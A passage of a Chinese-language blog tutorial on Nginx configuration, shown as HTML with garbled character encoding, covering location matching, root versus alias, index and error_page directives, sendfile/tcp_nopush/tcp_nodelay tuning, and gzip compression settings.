class="hljs-regexp">~ ^/abc\w$</span> &#123;<br>            <span class="hljs-attribute">default_type</span> text/plain;<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success~&quot;</span>;<br>        &#125;<br>            <br>        <br>       <br>        <span class="hljs-section">location</span><span class="hljs-regexp"> ^~</span> /abcd &#123;<br>            <span class="hljs-attribute">default_type</span> text/plain;<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success^~&quot;</span>;<br>            &#125;       <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿˜æ˜¯æœ‰å†™åœ¨.confæ–‡ä»¶ä¸­é¡ºåºçš„é—®é¢˜</p></blockquote><h4 id="è®¾ç½®è¯·æ±‚èµ„æºçš„ç›®å½•root-alias"><a class="markdownIt-Anchor" href="#è®¾ç½®è¯·æ±‚èµ„æºçš„ç›®å½•root-alias"></a> è®¾ç½®è¯·æ±‚èµ„æºçš„ç›®å½•root / alias</h4><p>rootï¼šè®¾ç½®è¯·æ±‚çš„æ ¹ç›®å½•</p><table><thead><tr><th>è¯­æ³•</th><th>root path;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>root html;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>pathä¸ºNginxæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚ä»¥åæŸ¥æ‰¾èµ„æºçš„æ ¹ç›®å½•è·¯å¾„ã€‚</p><p>aliasï¼šç”¨æ¥æ›´æ”¹locationçš„URI</p><table><thead><tr><th>è¯­æ³•</th><th>alias path;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>location</td></tr></tbody></table><p>pathä¸ºä¿®æ”¹åçš„æ ¹è·¯å¾„ã€‚</p><p>ä»¥ä¸Šä¸¤ä¸ªæŒ‡ä»¤éƒ½å¯ä»¥æ¥æŒ‡å®šè®¿é—®èµ„æºçš„è·¯å¾„ï¼Œé‚£ä¹ˆè¿™ä¸¤è€…ä¹‹é—´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?</p><p>ä¸¾ä¾‹è¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰åœ¨<code>/usr/local/nginx/html</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª imagesç›®å½•,å¹¶åœ¨ç›®å½•ä¸‹æ”¾å…¥ä¸€å¼ å›¾ç‰‡<code>mv.png</code>å›¾ç‰‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /images &#123;<br>root <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®å›¾ç‰‡çš„è·¯å¾„ä¸º:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span><span class="hljs-regexp">/images/m</span>v.png<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¦‚æœæŠŠrootæ”¹ä¸ºalias</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /images &#123;<br>alias <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†æ¬¡è®¿é—®ä¸Šè¿°åœ°å€ï¼Œé¡µé¢ä¼šå‡ºç°404çš„é”™è¯¯ï¼ŒæŸ¥çœ‹é”™è¯¯æ—¥å¿—ä¼šå‘ç°æ˜¯å› ä¸ºåœ°å€ä¸å¯¹ï¼Œæ‰€ä»¥éªŒè¯äº†ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">rootçš„å¤„ç†ç»“æœæ˜¯: rootè·¯å¾„+locationè·¯å¾„ï¼ˆ/imagesï¼‰<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html+<span class="hljs-regexp">/images+/m</span>v.pngï¼ˆæœªåŒ¹é…å®Œçš„è‡ªåŠ¨åŠ ä¸Šï¼‰<br>aliasçš„å¤„ç†ç»“æœæ˜¯:ä½¿ç”¨aliasè·¯å¾„æ›¿æ¢locationè·¯å¾„<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html+/mv.png<br></code></pre></td></tr></table></figure><p>éœ€è¦åœ¨aliasåé¢è·¯å¾„æ”¹ä¸º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /images &#123;<br>alias <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html/images;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å¦‚æœlocationè·¯å¾„æ˜¯ä»¥/ç»“å°¾,åˆ™aliasä¹Ÿå¿…é¡»æ˜¯ä»¥/ç»“å°¾ï¼Œrootæ²¡æœ‰è¦æ±‚</p><p>å°†ä¸Šè¿°é…ç½®ä¿®æ”¹ä¸º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location <span class="hljs-regexp">/images/</span> &#123;<br>alias <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html/images; <br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®å°±ä¼šå‡ºé—®é¢˜ï¼ŒæŸ¥çœ‹é”™è¯¯æ—¥å¿—è¿˜æ˜¯è·¯å¾„ä¸å¯¹ï¼Œæ‰€ä»¥éœ€è¦æŠŠaliasåé¢åŠ ä¸Š /</p><p>å°ç»“ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rootçš„å¤„ç†ç»“æœæ˜¯: rootè·¯å¾„+<span class="hljs-keyword">location</span>è·¯å¾„<br><span class="hljs-keyword">alias</span>çš„å¤„ç†ç»“æœæ˜¯:ä½¿ç”¨<span class="hljs-keyword">alias</span>è·¯å¾„æ›¿æ¢<span class="hljs-keyword">location</span>è·¯å¾„<br><span class="hljs-keyword">alias</span>æ˜¯ä¸€ä¸ªç›®å½•åˆ«åçš„å®šä¹‰ï¼Œrootåˆ™æ˜¯æœ€ä¸Šå±‚ç›®å½•çš„å«ä¹‰ã€‚<br>å¦‚æœ<span class="hljs-keyword">location</span>è·¯å¾„æ˜¯ä»¥/ç»“å°¾,åˆ™<span class="hljs-keyword">alias</span>ä¹Ÿå¿…é¡»æ˜¯ä»¥/ç»“å°¾ï¼Œrootæ²¡æœ‰è¦æ±‚<br></code></pre></td></tr></table></figure><h4 id="indexæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#indexæŒ‡ä»¤"></a> indexæŒ‡ä»¤</h4><p>index:è®¾ç½®ç½‘ç«™çš„é»˜è®¤é¦–é¡µ</p><table><thead><tr><th>è¯­æ³•</th><th>index file â€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>index index.html;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>indexåé¢å¯ä»¥è·Ÿå¤šä¸ªè®¾ç½®ï¼Œå¦‚æœè®¿é—®çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šå…·ä½“è®¿é—®çš„èµ„æºï¼Œåˆ™ä¼šä¾æ¬¡è¿›è¡ŒæŸ¥æ‰¾ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸ºæ­¢ã€‚</p><p>ä¸¾ä¾‹è¯´æ˜ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> / &#123;<br>root /usr/<span class="hljs-keyword">local</span>/nginx/html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br>è®¿é—®è¯¥<span class="hljs-keyword">location</span>çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡ http://ip:port/ï¼Œåœ°å€åé¢å¦‚æœä¸æ·»åŠ ä»»ä½•å†…å®¹ï¼Œåˆ™é»˜è®¤ä¾æ¬¡è®¿é—®<span class="hljs-keyword">index</span>.htmlå’Œ<span class="hljs-keyword">index</span>.htmï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¥è¿›è¡Œè¿”å›<br></code></pre></td></tr></table></figure><h4 id="error_pageæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#error_pageæŒ‡ä»¤"></a> error_pageæŒ‡ä»¤</h4><p>error_page:è®¾ç½®ç½‘ç«™çš„é”™è¯¯é¡µé¢</p><table><thead><tr><th>è¯­æ³•</th><th>error_page code â€¦ [=[response]] uri;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€locationâ€¦</td></tr></tbody></table><p>å½“å‡ºç°å¯¹åº”çš„å“åº”codeåï¼Œå¦‚ä½•æ¥å¤„ç†ã€‚</p><p>ä¸¾ä¾‹è¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰å¯ä»¥æŒ‡å®šå…·ä½“è·³è½¬çš„åœ°å€</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">server &#123;<br><span class="hljs-attribute">error_page 404 http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¯ä»¥æŒ‡å®šé‡å®šå‘åœ°å€</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">server&#123;<br>error_page <span class="hljs-number">404</span> /<span class="hljs-number">50</span>x.html<span class="hljs-comment">;</span><br>error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /<span class="hljs-number">50</span>x.html<span class="hljs-comment">;</span><br>location <span class="hljs-operator">=/</span><span class="hljs-number">50</span>x.html&#123;<br>root html<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ä½¿ç”¨locationçš„@ç¬¦åˆå®Œæˆé”™è¯¯ä¿¡æ¯å±•ç¤º</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">server&#123;<br>error<span class="hljs-number">_p</span>age <span class="hljs-number">404</span> <span class="hljs-meta">@jump_to_error</span>;<br>location <span class="hljs-meta">@jump_to_error</span> &#123;<br><span class="hljs-keyword">default</span><span class="hljs-number">_</span>type text/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">404</span> <span class="hljs-string">&#x27;Not Found Page...&#x27;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯é€‰é¡¹<code>=[response]</code>çš„ä½œç”¨æ˜¯ç”¨æ¥å°†ç›¸åº”ä»£ç æ›´æ”¹ä¸ºå¦å¤–ä¸€ä¸ª</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">server&#123;<br>error_page <span class="hljs-number">404</span> <span class="hljs-operator">=</span><span class="hljs-number">200</span> /<span class="hljs-number">50</span>x.html<span class="hljs-comment">;</span><br>location <span class="hljs-operator">=/</span><span class="hljs-number">50</span>x.html&#123;<br>root html<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br>è¿™æ ·çš„è¯ï¼Œå½“è¿”å›<span class="hljs-number">404</span>æ‰¾ä¸åˆ°å¯¹åº”çš„èµ„æºçš„æ—¶å€™ï¼Œåœ¨æµè§ˆå™¨ä¸Šå¯ä»¥çœ‹åˆ°ï¼Œæœ€ç»ˆè¿”å›çš„çŠ¶æ€ç æ˜¯<span class="hljs-number">200</span>ï¼Œè¿™å—éœ€è¦æ³¨æ„ä¸‹ï¼Œç¼–å†™error_pageåé¢çš„å†…å®¹ï¼Œ<span class="hljs-number">404</span>åé¢éœ€è¦åŠ ç©ºæ ¼ï¼Œ<span class="hljs-number">200</span>å‰é¢ä¸èƒ½åŠ ç©ºæ ¼<br></code></pre></td></tr></table></figure><h3 id="é™æ€èµ„æºä¼˜åŒ–é…ç½®è¯­æ³•"><a class="markdownIt-Anchor" href="#é™æ€èµ„æºä¼˜åŒ–é…ç½®è¯­æ³•"></a> é™æ€èµ„æºä¼˜åŒ–é…ç½®è¯­æ³•</h3><p>Nginxå¯¹é™æ€èµ„æºå¦‚ä½•è¿›è¡Œä¼˜åŒ–é…ç½®ã€‚è¿™é‡Œä»ä¸‰ä¸ªå±æ€§é…ç½®è¿›è¡Œä¼˜åŒ–ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nodeplay</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><p>ï¼ˆ1ï¼‰sendï¬leï¼Œç”¨æ¥å¼€å¯é«˜æ•ˆçš„æ–‡ä»¶ä¼ è¾“æ¨¡å¼ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>sendï¬le on |oï¬€;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>sendï¬le oï¬€;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€locationâ€¦</td></tr></tbody></table><p>è¯·æ±‚é™æ€èµ„æºçš„è¿‡ç¨‹ï¼šå®¢æˆ·ç«¯é€šè¿‡ç½‘ç»œæ¥å£å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼Œæ“ä½œç³»ç»Ÿå°†è¿™äº›å®¢æˆ·ç«¯çš„è¯·æ±‚ä¼ é€’ç»™æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºï¼ŒæœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºä¼šå¤„ç†è¿™äº›è¯·æ±‚ï¼Œè¯·æ±‚å¤„ç†å®Œæˆä»¥åï¼Œæ“ä½œç³»ç»Ÿè¿˜éœ€è¦å°†å¤„ç†å¾—åˆ°çš„ç»“æœé€šè¿‡ç½‘ç»œé€‚é…å™¨ä¼ é€’å›å»ã€‚</p><p>å¦‚ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name localhostï¼›<br><span class="hljs-keyword">location</span> / &#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html;<br>&#125;<br>&#125;<br>åœ¨htmlç›®å½•ä¸‹æœ‰ä¸€ä¸ªwelcome.htmlé¡µé¢ï¼Œè®¿é—®åœ°å€<br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.133</span>/welcome.html<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587655397104.png" alt="1587655397104" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587665814562.png" alt="1587665814562" /></p><p>ï¼ˆ2ï¼‰tcp_nopushï¼šè¯¥æŒ‡ä»¤å¿…é¡»åœ¨sendfileæ‰“å¼€çš„çŠ¶æ€ä¸‹æ‰ä¼šç”Ÿæ•ˆï¼Œä¸»è¦æ˜¯ç”¨æ¥æå‡ç½‘ç»œåŒ…çš„ä¼ è¾“â€™æ•ˆç‡â€™</p><table><thead><tr><th>è¯­æ³•</th><th>tcp_nopush on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>tcp_nopush oï¬€;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>ï¼ˆ3ï¼‰tcp_nodelayï¼šè¯¥æŒ‡ä»¤å¿…é¡»åœ¨keep-aliveè¿æ¥å¼€å¯çš„æƒ…å†µä¸‹æ‰ç”Ÿæ•ˆï¼Œæ¥æé«˜ç½‘ç»œåŒ…ä¼ è¾“çš„â€™å®æ—¶æ€§â€™</p><table><thead><tr><th>è¯­æ³•</th><th>tcp_nodelay on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>tcp_nodelay on;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587832596733.png" alt="1587832596733" /></p><p>ç»è¿‡åˆšæ‰çš„åˆ†æï¼Œâ€œtcp_nopush&quot;å’Œâ€tcp_nodelayâ€œçœ‹èµ·æ¥æ˜¯&quot;äº’æ–¥çš„â€ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¦å°†è¿™ä¸¤ä¸ªå€¼éƒ½æ‰“å¼€ï¼Œè¿™ä¸ªå¤§å®¶éœ€è¦çŸ¥é“çš„æ˜¯åœ¨linux2.5.9ä»¥åçš„ç‰ˆæœ¬ä¸­ä¸¤è€…æ˜¯å¯ä»¥å…¼å®¹çš„ï¼Œä¸‰ä¸ªæŒ‡ä»¤éƒ½å¼€å¯çš„å¥½å¤„æ˜¯ï¼Œsendfileå¯ä»¥å¼€å¯é«˜æ•ˆçš„æ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œtcp_nopushå¼€å¯å¯ä»¥ç¡®ä¿åœ¨å‘é€åˆ°å®¢æˆ·ç«¯ä¹‹å‰æ•°æ®åŒ…å·²ç»å……åˆ†â€œå¡«æ»¡â€ï¼Œ è¿™å¤§å¤§å‡å°‘äº†ç½‘ç»œå¼€é”€ï¼Œå¹¶åŠ å¿«äº†æ–‡ä»¶å‘é€çš„é€Ÿåº¦ã€‚ ç„¶åï¼Œå½“å®ƒåˆ°è¾¾æœ€åä¸€ä¸ªå¯èƒ½å› ä¸ºæ²¡æœ‰â€œå¡«æ»¡â€è€Œæš‚åœçš„æ•°æ®åŒ…æ—¶ï¼ŒNginxä¼šå¿½ç•¥tcp_nopushå‚æ•°ï¼Œ ç„¶åï¼Œtcp_nodelayå¼ºåˆ¶å¥—æ¥å­—å‘é€æ•°æ®ã€‚ç”±æ­¤å¯çŸ¥ï¼ŒTCP_NOPUSHå¯ä»¥ä¸TCP_NODELAYä¸€èµ·è®¾ç½®ï¼Œå®ƒæ¯”å•ç‹¬é…ç½®TCP_NODELAYå…·æœ‰æ›´å¼ºçš„æ€§èƒ½ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹é…ç½®æ¥ä¼˜åŒ–Nginxé™æ€èµ„æºçš„å¤„ç†</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nodelay</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><h3 id="nginxé™æ€èµ„æºå‹ç¼©å®æˆ˜"><a class="markdownIt-Anchor" href="#nginxé™æ€èµ„æºå‹ç¼©å®æˆ˜"></a> Nginxé™æ€èµ„æºå‹ç¼©å®æˆ˜</h3><p>ç»è¿‡ä¸Šè¿°å†…å®¹çš„ä¼˜åŒ–ï¼Œæˆ‘ä»¬å†æ¬¡æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Œå‡å¦‚åœ¨æ»¡è¶³ä¸Šè¿°ä¼˜åŒ–çš„å‰æä¸‹ï¼Œæˆ‘ä»¬ä¼ é€ä¸€ä¸ª1Mçš„æ•°æ®å’Œä¸€ä¸ª10Mçš„æ•°æ®é‚£ä¸ªæ•ˆç‡é«˜?ï¼Œç­”æ¡ˆæ˜¾è€Œæ˜“è§ï¼Œä¼ è¾“å†…å®¹å°ï¼Œé€Ÿåº¦å°±ä¼šå¿«ã€‚é‚£ä¹ˆé—®é¢˜åˆæ¥äº†ï¼ŒåŒæ ·çš„å†…å®¹ï¼Œå¦‚æœæŠŠå¤§å°é™ä¸‹æ¥ï¼Œæˆ‘ä»¬è„‘è¢‹é‡Œé¢è¦è¹¦å‡ºä¸€ä¸ªè¯å°±æ˜¯&quot;å‹ç¼©&quot;ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥å­¦ä¹ Nginxçš„é™æ€èµ„æºå‹ç¼©æ¨¡å—ã€‚</p><p>åœ¨Nginxçš„é…ç½®æ–‡ä»¶ä¸­å¯ä»¥é€šè¿‡é…ç½®gzipæ¥å¯¹é™æ€èµ„æºè¿›è¡Œå‹ç¼©ï¼Œç›¸å…³çš„æŒ‡ä»¤å¯ä»¥é…ç½®åœ¨httpå—ã€serverå—å’Œlocationå—ä¸­ï¼ŒNginxå¯ä»¥é€šè¿‡</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ngx<span class="hljs-emphasis">_http_gzip_moduleæ¨¡å—</span><br><span class="hljs-emphasis">ngx_http_gzip_static_moduleæ¨¡å—</span><br><span class="hljs-emphasis">ngx_http_gunzip_</span>moduleæ¨¡å—<br></code></pre></td></tr></table></figure><p>å¯¹è¿™äº›æŒ‡ä»¤è¿›è¡Œè§£æå’Œå¤„ç†ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä»ä»¥ä¸‹å†…å®¹è¿›è¡Œå­¦ä¹ </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">ï¼ˆ1ï¼‰Gzipå„æ¨¡å—æ”¯æŒçš„é…ç½®æŒ‡ä»¤<br>ï¼ˆ2ï¼‰Gzipå‹ç¼©åŠŸèƒ½çš„é…ç½®<br>ï¼ˆ3ï¼‰Gzipå’Œsendfileçš„å†²çªè§£å†³<br>ï¼ˆ4ï¼‰æµè§ˆå™¨ä¸æ”¯æŒGzipçš„è§£å†³æ–¹æ¡ˆ<br></code></pre></td></tr></table></figure><h4 id="gzipæ¨¡å—é…ç½®æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#gzipæ¨¡å—é…ç½®æŒ‡ä»¤"></a> Gzipæ¨¡å—é…ç½®æŒ‡ä»¤</h4><p>æ¥ä¸‹æ¥æ‰€å­¦ä¹ çš„æŒ‡ä»¤éƒ½æ¥è‡ªngx_http_gzip_moduleæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¼šåœ¨nginxå®‰è£…çš„æ—¶å€™å†…ç½®åˆ°nginxçš„å®‰è£…ç¯å¢ƒä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›æŒ‡ä»¤ã€‚</p><ol><li>gzipæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤ç”¨äºå¼€å¯æˆ–è€…å…³é—­gzipåŠŸèƒ½</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€locationâ€¦</td></tr></tbody></table><p>æ³¨æ„åªæœ‰è¯¥æŒ‡ä»¤ä¸ºæ‰“å¼€çŠ¶æ€ï¼Œä¸‹é¢çš„æŒ‡ä»¤æ‰æœ‰æ•ˆæœ</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>   gzip on<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>gzip_typesæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤å¯ä»¥æ ¹æ®å“åº”é¡µçš„MIMEç±»å‹é€‰æ‹©æ€§åœ°å¼€å¯Gzipå‹ç¼©åŠŸèƒ½</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_types mime-type â€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_types text/html;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>æ‰€é€‰æ‹©çš„å€¼å¯ä»¥ä»mime.typesæ–‡ä»¶ä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&quot;*&quot;ä»£è¡¨æ‰€æœ‰ã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>gzip_types application/javascript<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>gzip_comp_levelæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤ç”¨äºè®¾ç½®Gzipå‹ç¼©ç¨‹åº¦ï¼Œçº§åˆ«ä»1-9,1è¡¨ç¤ºè¦æ˜¯ç¨‹åº¦æœ€ä½ï¼Œè¦æ˜¯æ•ˆç‡æœ€é«˜ï¼Œ9åˆšå¥½ç›¸åï¼Œå‹ç¼©ç¨‹åº¦æœ€é«˜ï¼Œä½†æ˜¯æ•ˆç‡æœ€ä½æœ€è´¹æ—¶é—´ã€‚</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_comp_level level;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_comp_level 1;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>gzip_comp_level <span class="hljs-number">6</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>gzip_varyæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤ç”¨äºè®¾ç½®ä½¿ç”¨Gzipè¿›è¡Œå‹ç¼©å‘é€æ˜¯å¦æºå¸¦â€œVary:Accept-Encodingâ€å¤´åŸŸçš„å“åº”å¤´éƒ¨ã€‚ä¸»è¦æ˜¯å‘Šè¯‰æ¥æ”¶æ–¹ï¼Œæ‰€å‘é€çš„æ•°æ®ç»è¿‡äº†Gzipå‹ç¼©å¤„ç†</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_vary on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_vary off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587361606028.png" alt="1587361606028" /></p><ol start="5"><li>gzip_buffersæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤ç”¨äºå¤„ç†è¯·æ±‚å‹ç¼©çš„ç¼“å†²åŒºæ•°é‡å’Œå¤§å°ã€‚</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_buffers number size;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_buffers 32 4k|16 